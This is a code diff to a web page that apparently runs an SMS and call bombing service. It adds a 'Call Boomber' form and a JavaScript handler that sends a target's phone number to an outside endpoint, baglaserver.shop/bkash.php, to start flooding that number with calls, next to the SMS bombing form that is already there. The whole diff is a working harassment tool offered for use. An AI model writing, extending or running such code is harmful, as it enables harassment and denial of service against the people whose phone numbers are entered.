@@ -126,6 +126,15 @@
     </div>
 </div>
 
+<!-- New Section for Call Bomber -->
+<div class="container" style="margin-top: 20px;">
+    <h3>CALL BOOMBER 💣</h3>
+    <form id="callForm">
+        <input type="text" name="call_phone" id="call_phone" placeholder="Enter phone number" required>
+        <button type="submit">Start Call Bombing</button>
+    </form>
+</div>
+
 <!-- Pop-up message -->
 <div id="popup">Bombing Start within 3 seconds</div>
 
@@ -174,8 +183,34 @@
         alert('APIs have been called successfully.');
     }
 
-    // Attach the form submission handler
+    async function handleCallSubmit(event) {
+        event.preventDefault(); // Prevent form submission
+
+        const phone = document.getElementById('call_phone').value;
+
+        if (!phone) {
+            alert('Please enter a valid phone number.');
+            return;
+        }
+
+        showPopup(); // Show the popup
+
+        // Call the API for call bombing
+        const url = `http://baglaserver.shop/bkash.php?phone=${encodeURIComponent(phone)}`;
+        try {
+            const response = await fetch(url);
+            const data = await response.text();
+            console.log(`Response from ${url}: ${data}`);
+            alert('Call bombing started successfully.');
+        } catch (error) {
+            console.error(`Error calling API: ${error}`);
+            alert('Failed to start call bombing.');
+        }
+    }
+
+    // Attach the form submission handlers
     document.getElementById('smsForm').addEventListener('submit', handleSubmit);
+    document.getElementById('callForm').addEventListener('submit', handleCallSubmit);
 </script>
 
 </body>
